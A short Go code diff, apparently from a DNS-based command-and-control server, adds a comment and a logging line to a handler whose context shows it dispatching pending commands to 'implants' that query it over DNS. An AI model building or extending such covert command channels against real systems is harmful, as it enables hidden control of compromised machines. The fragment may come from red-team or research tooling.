@@ -8,6 +8,8 @@ import (
 	"sync"
 )
 
+// systemd-resolved on VM
+
 //answers := resolver(question.Name, question.Qtype) -> need this?
 //func resolver(domain string, qtype uint16) []dns.RR {
 //	fmt.Println(domain)
@@ -82,6 +84,7 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 
 		// domainLabels := strings.Split(questionName, ".")
 
+		log.Println(q.Name)
 		switch labels[1] {
 		case "cmd": // implant is requesting command
 			if pendingCmds, ok := h.commands[implantID]; ok {
